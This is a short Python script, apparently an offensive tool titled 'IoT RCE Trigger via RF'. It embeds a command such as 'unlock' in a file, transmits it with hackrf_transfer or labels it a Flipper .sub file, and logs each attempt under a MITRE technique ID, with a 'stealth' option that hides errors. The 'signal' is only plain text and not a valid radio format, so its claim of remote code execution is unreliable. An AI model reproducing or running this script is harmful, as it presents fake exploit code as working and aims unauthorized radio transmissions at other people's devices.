

import argparse
import os
import json
import time
from datetime import datetime
import subprocess

LOG_PATH = "results/exploit_logs.json"
SIGNAL_PATH = "results/rf/iot_rce_trigger.sub"
MITRE_TTP = "T0866"  # ICS: Wireless Protocol Abuse

def log_result(entry):
    os.makedirs("results/rf", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def trigger_rce(frequency, payload, sdr_tool="flipper", stealth=False):
    timestamp = datetime.utcnow().isoformat()
    signal_data = f"CMD:{payload}\nTIME:{timestamp}\n"

    try:
        with open(SIGNAL_PATH, "w") as f:
            f.write(signal_data)

        if sdr_tool == "flipper":
            print(f"[+] Generating Flipper .sub file at {SIGNAL_PATH}")
        elif sdr_tool == "hackrf":
            print("[+] Sending RF packet via HackRF...")
            subprocess.run(["hackrf_transfer", "-f", str(frequency), "-x", "30", "-s", "2000000", "-t", SIGNAL_PATH], check=True)
        else:
            raise Exception("Unsupported SDR tool")

        entry = {
            "timestamp": timestamp,
            "frequency": frequency,
            "type": "iot_rce_radio",
            "payload": payload,
            "signal_file": SIGNAL_PATH,
            "tool": sdr_tool,
            "ttp": MITRE_TTP
        }
        log_result(entry)
        print("[âœ“] IoT RCE RF payload logged.")
    except Exception as e:
        if not stealth:
            print(f"[!] Failed to trigger RF RCE: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="IoT RCE Trigger via RF")
    parser.add_argument("--freq", required=True, help="Frequency in Hz (e.g. 433920000)")
    parser.add_argument("--cmd", required=True, help="Payload/command to embed (e.g. unlock, reboot)")
    parser.add_argument("--sdr", choices=["flipper", "hackrf"], default="flipper")
    parser.add_argument("--stealth", action="store_true")
    args = parser.parse_args()

    trigger_rce(args.freq, args.cmd, args.sdr, args.stealth)
